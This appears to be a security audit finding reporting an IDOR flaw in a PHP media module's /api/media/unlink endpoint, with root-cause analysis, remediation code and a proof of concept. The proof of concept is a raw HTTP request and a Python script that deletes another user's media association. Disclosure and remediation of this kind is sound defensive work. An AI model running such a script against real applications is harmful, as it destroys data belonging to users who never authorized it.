# Insecure Direct Object Reference (IDOR) in Media Unlink API Allows Unauthorized Deletion of Media Associations

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-03-29 18:26:42 UTC
**Target:** /workspace/Platform
**Endpoint:** /api/media/unlink
**Method:** POST
**CWE:** CWE-639
**CVSS:** 7.6

## Description

A critical insecure direct object reference (IDOR) vulnerability was identified in the Media module's unlinkMedia API endpoint. The endpoint `/api/media/unlink` allows any authenticated user to delete media associations without proper authorization checks.

The vulnerability exists because the endpoint lacks the required permission middleware that other destructive operations in the Media module utilize. While the route group requires API token authentication, the specific endpoint does not enforce the `token-can:media.medias.destroy` permission that other media deletion endpoints require.

This allows authenticated users to delete any media association by simply providing the `imageableId` parameter, regardless of whether they own the media or have the appropriate permissions.

## Impact

Successful exploitation allows an attacker to:
- Delete media associations belonging to other users
- Break content relationships across the application
- Cause data integrity issues by removing media from pages, posts, or other entities
- Potentially disrupt application functionality that relies on media associations
- Delete administrative or system media associations

The impact is particularly severe in multi-tenant environments where users should only be able to manage their own media content.

## Technical Analysis

The vulnerability stems from inconsistent authorization enforcement in the Media module's API routes. 

In `/workspace/Platform/Modules/Media/Http/apiRoutes.php`, most destructive operations include proper permission middleware:
- Line 90: `'middleware' => 'token-can:media.medias.destroy'` for file deletion
- Line 96: `'middleware' => 'token-can:media.medias.destroy'` for batch destruction

However, the `unlinkMedia` endpoint at lines 46-49 lacks this critical authorization check:
```php
$router->post('media/unlink', [
    'uses' => 'MediaController@unlinkMedia',
    'as' => 'api.media.unlink',
    // MISSING: 'middleware' => 'token-can:media.medias.destroy'
]);
```

The `unlinkMedia` method in `MediaController.php` directly accepts user-provided `imageableId` and performs the deletion without ownership verification:
```php
$imageableId = $request->get('imageableId');
$deleted = DB::table('media__imageables')->whereId($imageableId)->delete();
```

This creates a classic IDOR vulnerability where users can manipulate object identifiers to access resources they don't own.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate to the application with any valid user account
2. Identify a media association ID (`imageableId`) that belongs to another user or system
3. Send a POST request to `/api/media/unlink` with the target `imageableId`:
```http
POST /api/media/unlink HTTP/1.1
Host: target-app.com
Authorization: Bearer [valid-api-token]
Content-Type: application/x-www-form-urlencoded

imageableId=123
```

4. The server will respond with success even if the media association belongs to another user
5. Verify the media association has been deleted by checking the affected content

```
import requests
import json

# Configuration
BASE_URL = "https://target-app.com"
API_TOKEN = "valid-user-token"  # Any authenticated user's token
TARGET_IMAGEABLE_ID = 123  # ID of media association to delete

def exploit_idor():
    headers = {
        "Authorization": f"Bearer {API_TOKEN}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "imageableId": TARGET_IMAGEABLE_ID
    }
    
    response = requests.post(
        f"{BASE_URL}/api/media/unlink",
        headers=headers,
        data=data
    )
    
    if response.status_code == 200:
        result = response.json()
        if result.get('error') is False:
            print(f"✅ Successfully deleted media association ID {TARGET_IMAGEABLE_ID}")
            print(f"Response: {result}")
        else:
            print(f"❌ Deletion failed: {result}")
    else:
        print(f"❌ HTTP Error: {response.status_code}")
        print(f"Response: {response.text}")

if __name__ == "__main__":
    exploit_idor()
```

## Code Analysis

**Location 1:** `Modules/Media/Http/apiRoutes.php` (lines 46-49)
  Missing authorization middleware on unlink endpoint
  ```
      $router->post('media/unlink', [
        'uses' => 'MediaController@unlinkMedia',
        'as' => 'api.media.unlink',
    ]);
  ```

  **Suggested Fix:**
```diff
-     $router->post('media/unlink', [
-         'uses' => 'MediaController@unlinkMedia',
-         'as' => 'api.media.unlink',
-     ]);
+     $router->post('media/unlink', [
+         'uses' => 'MediaController@unlinkMedia',
+         'as' => 'api.media.unlink',
+         'middleware' => 'token-can:media.medias.destroy'
+     ]);
```

**Location 2:** `Modules/Media/Http/Controllers/Api/MediaController.php` (lines 212-229)
  Missing ownership verification in unlinkMedia method
  ```
      public function unlinkMedia(Request $request) : JsonResponse
    {
        $imageableId = $request->get('imageableId');
        $deleted = DB::table('media__imageables')->whereId($imageableId)->delete();
        if (! $deleted) {
            return response()->json([
                'error' => true,
                'message' => 'The file was not found.',
            ]);
        }

        event(new FileWasUnlinked($imageableId));

        return response()->json([
            'error' => false,
            'message' => 'The link has been removed.',
        ]);
    }
  ```

## Remediation

1. Add the missing authorization middleware to the unlinkMedia route:
```php
$router->post('media/unlink', [
    'uses' => 'MediaController@unlinkMedia',
    'as' => 'api.media.unlink',
    'middleware' => 'token-can:media.medias.destroy'
]);
```

2. Implement ownership verification in the unlinkMedia method:
```php
public function unlinkMedia(Request $request) : JsonResponse
{
    $imageableId = $request->get('imageableId');
    
    // Verify the current user owns this media association
    $mediaAssociation = DB::table('media__imageables')->whereId($imageableId)->first();
    if (!$mediaAssociation) {
        return response()->json([
            'error' => true,
            'message' => 'Media association not found.',
        ]);
    }
    
    // Add ownership check - implementation depends on your auth system
    if (!$this->userOwnsMediaAssociation($mediaAssociation)) {
        return response()->json([
            'error' => true,
            'message' => 'Unauthorized to delete this media association.',
        ]);
    }
    
    $deleted = DB::table('media__imageables')->whereId($imageableId)->delete();
    
    if (!$deleted) {
        return response()->json([
            'error' => true,
            'message' => 'The file was not found.',
        ]);
    }

    event(new FileWasUnlinked($imageableId));

    return response()->json([
        'error' => false,
        'message' => 'The link has been removed.',
    ]);
}
```

3. Conduct a security review of all API endpoints to ensure consistent authorization enforcement.
